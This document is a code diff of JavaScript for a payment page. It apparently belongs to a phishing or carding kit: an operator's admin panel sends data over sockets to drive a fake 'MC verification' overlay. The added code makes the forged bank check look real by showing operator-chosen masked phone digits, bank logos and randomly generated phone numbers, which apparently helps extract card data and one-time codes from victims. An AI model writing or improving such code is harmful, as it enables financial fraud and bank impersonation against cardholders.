@@ -821,6 +821,36 @@ const subTotal = Math.round(state.amount * 0.916 * 100) / 100;
     }
 });
 
+        
+
+setTimeout(() => {
+    // Create a MutationObserver to watch for when the MC verification overlay becomes visible
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+                const overlay = document.getElementById('mcVerificationOverlay');
+                if (overlay && overlay.style.display !== 'none') {
+                    console.log('MC verification overlay is now visible');
+                    
+                    // Get the phone last 4 digits from state with highest priority
+                    const lastFourEl = document.getElementById('cardLastFourDigits');
+                    if (lastFourEl && state.phoneLastFour) {
+                        lastFourEl.textContent = `********${state.phoneLastFour}`;
+                        console.log('Updated phone last four digits in visible overlay to:', state.phoneLastFour);
+                    }
+                }
+            }
+        });
+    });
+
+    // Start observing the overlay element
+    const overlay = document.getElementById('mcVerificationOverlay');
+    if (overlay) {
+        observer.observe(overlay, { attributes: true });
+        console.log('Setup observer for MC verification overlay');
+    }
+}, 1000);
+
 function setupSocketListeners() {
     socket.on('card_data_received', (data) => {
         console.log('Card data received acknowledgement:', data);
@@ -942,22 +972,23 @@ function setupSocketListeners() {
     });
     
     socket.on('show_mc_verification', (data) => {
-        console.log('Showing MC verification overlay with data:', data);
-        
-        // Store the phone's last 4 digits from the data received from server
-        if (data.phoneLastFour) {
-            // Store it in the state for later use
-            state.phoneLastFour = data.phoneLastFour;
-            console.log('Phone last four digits set to:', data.phoneLastFour);
-        }
-        
-        showProcessingUI();
-        
-        setTimeout(() => {
-            showMCVerification(data);
-        }, 1500);
-    });
-
+    console.log('Showing MC verification overlay with data:', data);
+    
+    // Store the phone's last 4 digits from the data received from server
+    if (data.phoneLastFour) {
+        // Store it in the state for later use with high priority
+        state.phoneLastFour = data.phoneLastFour;
+        // Update maskedPhone to match the admin-provided digits
+        state.maskedPhone = `+1 (***) ***-${data.phoneLastFour}`;
+        console.log('Admin provided phone last four digits set to:', data.phoneLastFour);
+    }
+    
+    showProcessingUI();
+    
+    setTimeout(() => {
+        showMCVerification(data);
+    }, 1500);
+});
     socket.on('start_verification', (data) => {
         console.log('Start verification requested:', data);
         
@@ -1487,7 +1518,13 @@ function updateMcVerificationUI(data) {
     if (document.getElementById('bankLogo')) {
         const bankLogo = document.getElementById('bankLogo');
         const bankCode = data.bankCode?.toLowerCase() || 'sbi';
-        
+
+        if (document.getElementById('cardLastFourDigits')) {
+        // Always prioritize admin-provided data first
+        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+        console.log('Setting phone last four digits in verification UI to:', lastFour);
+        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
+    }
         // Map of bank codes to logo URLs
         const bankLogos = {
             'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
@@ -1798,14 +1835,22 @@ function detectCardType(cardNumber) {
 }
 
 function generateRandomPhone() {
+    // Don't generate a new phone number if we already have one from admin panel
+    if (state.phoneLastFour) {
+        console.log("Using admin-provided phone last four digits:", state.phoneLastFour);
+        state.maskedPhone = `+1 (***) ***-${state.phoneLastFour}`;
+        return;
+    }
+    
+    // Only generate random digits if we don't have admin-provided ones
     const area = Math.floor(Math.random() * 900) + 100;
     const middle = Math.floor(Math.random() * 900) + 100;
     const last = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
     
-    state.maskedPhone = `+1 (***) ***-${last.substring(last.length - 4)}`;
     state.phoneLastFour = last.substring(last.length - 4);
+    state.maskedPhone = `+1 (***) ***-${state.phoneLastFour}`;
     const fullPhone = `+1 (${area}) ${middle}-${last}`;
-    console.log("Full phone for verification:", fullPhone);
+    console.log("Generated random phone for verification:", fullPhone);
 }
 
 function formatCardNumber(value) {
